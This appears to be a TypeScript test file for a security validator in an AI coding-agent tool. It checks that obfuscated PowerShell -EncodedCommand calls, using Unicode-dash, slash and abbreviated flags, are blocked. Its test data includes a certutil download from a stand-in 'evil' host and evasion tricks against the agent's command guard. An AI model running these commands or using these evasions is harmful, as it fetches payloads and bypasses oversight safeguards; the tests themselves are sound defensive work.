/**
 * Claude-parity hardening for detectPowerShellExecution in bash-security.ts.
 *
 * Gap: references/claude/claude-code-main/src/tools/PowerShellTool/powershellSecurity.ts
 *   L67-L100 — "Alternative parameter-prefix recognition for PowerShell flags
 *   (/, en-dash U+2013, em-dash U+2014, horizontal-bar U+2015) plus
 *   parameter-abbreviation matching (psExeHasParamAbbreviation /
 *   commandHasArgAbbreviation)".
 *
 * PowerShell's tokenizer (SpecialCharacters.IsDash) and powershell.exe's
 * CommandLineParameterParser accept en-dash/em-dash/horizontal-bar and the `/`
 * delimiter as equivalent to the ASCII hyphen-minus, and match ANY unambiguous
 * prefix of a parameter name (`-e` … `-encodedcommand`). AMI previously only
 * matched an ASCII `-` with an enumerated flag list, so `powershell –enc <b64>`,
 * `powershell /enc <b64>`, and `powershell -enco <b64>` bypassed the
 * -EncodedCommand guard entirely.
 *
 * Each RED case is an evasion that MUST be blocked (fails if the fix is
 * reverted); each GREEN case is a benign lookalike that MUST stay allowed.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { detectPowerShellExecution, validateBashSecurity } from '../src/tools/bash-security';

const EN_DASH = '–';
const EM_DASH = '—';
const HBAR = '―';

describe('detectPowerShellExecution: alternative parameter prefixes', () => {
  it('RED: en-dash prefix on -enc is treated as a parameter', () => {
    assert.equal(detectPowerShellExecution(`powershell ${EN_DASH}enc ZQBjAGgA`).blocked, true);
  });
  it('RED: em-dash prefix on -enc is treated as a parameter', () => {
    assert.equal(detectPowerShellExecution(`powershell ${EM_DASH}enc ZQBjAGgA`).blocked, true);
  });
  it('RED: horizontal-bar prefix on -EncodedCommand is treated as a parameter', () => {
    assert.equal(detectPowerShellExecution(`powershell ${HBAR}EncodedCommand ZQBjAGgA`).blocked, true);
  });
  it('RED: forward-slash prefix (Windows PowerShell 5.1) on /enc is treated as a parameter', () => {
    assert.equal(detectPowerShellExecution('powershell /enc ZQBjAGgA').blocked, true);
  });
  it('RED: en-dash prefix on certutil -urlcache is treated as a parameter', () => {
    assert.equal(
      detectPowerShellExecution(`certutil ${EN_DASH}urlcache -split -f http://evil/x x`).blocked,
      true,
    );
  });
  it('RED: forward-slash prefix on certutil /urlcache is treated as a parameter', () => {
    assert.equal(
      detectPowerShellExecution('certutil /urlcache -split -f http://evil/x x').blocked,
      true,
    );
  });
});

describe('detectPowerShellExecution: parameter abbreviation matching', () => {
  // Every prefix of -EncodedCommand of length >= 1 selects the parameter.
  for (const abbrev of ['e', 'en', 'enc', 'enco', 'encod', 'encode', 'encoded', 'encodedc', 'encodedcommand']) {
    it(`RED: -${abbrev} abbreviation of -EncodedCommand is blocked`, () => {
      assert.equal(detectPowerShellExecution(`pwsh -${abbrev} ZQBjAGgA`).blocked, true);
    });
  }
});

describe('detectPowerShellExecution: no new false positives', () => {
  it('GREEN: -File is not an -EncodedCommand abbreviation', () => {
    assert.equal(detectPowerShellExecution('pwsh -File build.ps1').blocked, false);
  });
  it('GREEN: -Command is not an -EncodedCommand abbreviation', () => {
    assert.equal(detectPowerShellExecution('pwsh -Command Get-Date').blocked, false);
  });
  it('GREEN: -ExecutionPolicy is not an -EncodedCommand abbreviation', () => {
    // A benign policy value (RemoteSigned) proves `-ExecutionPolicy` is not
    // misread as the `-EncodedCommand` abbreviation. (The `Bypass`/`Unrestricted`
    // values ARE blocked by the dedicated execution-policy-bypass check — see
    // bash-security-u015-ps-dangerous-categories.test.ts.)
    assert.equal(detectPowerShellExecution('powershell -ExecutionPolicy RemoteSigned -File x.ps1').blocked, false);
  });
  it('GREEN: a forward-slash path argument is not a parameter', () => {
    assert.equal(detectPowerShellExecution('pwsh -File /etc/build/run.ps1').blocked, false);
  });
  it('GREEN: ASCII -e still blocks (regression lock)', () => {
    assert.equal(detectPowerShellExecution('powershell -e ZQBjAGgA').blocked, true);
  });
  it('GREEN: full -EncodedCommand still blocks (regression lock)', () => {
    assert.equal(detectPowerShellExecution('pwsh -EncodedCommand ZQBjAGgAbwA=').blocked, true);
  });
});

describe('detectPowerShellExecution: wired through validateBashSecurity', () => {
  it('RED: en-dash -enc evasion is blocked end-to-end', () => {
    const result = validateBashSecurity(`powershell ${EN_DASH}enc ZQBjAGgA`);
    assert.equal(result.safe, false);
  });
  it('RED: -enco abbreviation evasion is blocked end-to-end', () => {
    const result = validateBashSecurity('powershell -enco ZQBjAGgA');
    assert.equal(result.safe, false);
  });
});
